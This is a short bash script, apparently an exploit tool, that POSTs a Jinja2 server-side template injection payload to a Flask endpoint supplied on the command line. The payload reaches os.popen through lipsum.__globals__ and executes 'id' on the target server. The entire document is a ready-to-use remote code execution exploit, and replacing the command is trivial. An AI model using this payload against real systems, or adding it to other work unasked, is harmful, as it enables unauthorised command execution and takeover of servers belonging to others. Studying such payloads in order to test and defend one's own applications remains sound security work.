#!/bin/bash
# Flask SSTI — POST param RCE via lipsum globals
# Usage: post_ssti_rce.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

curl -s -X POST "$ENDPOINT" \
  --data-urlencode "name={{lipsum.__globals__['os'].popen('id').read()}}" \
  --max-time 10
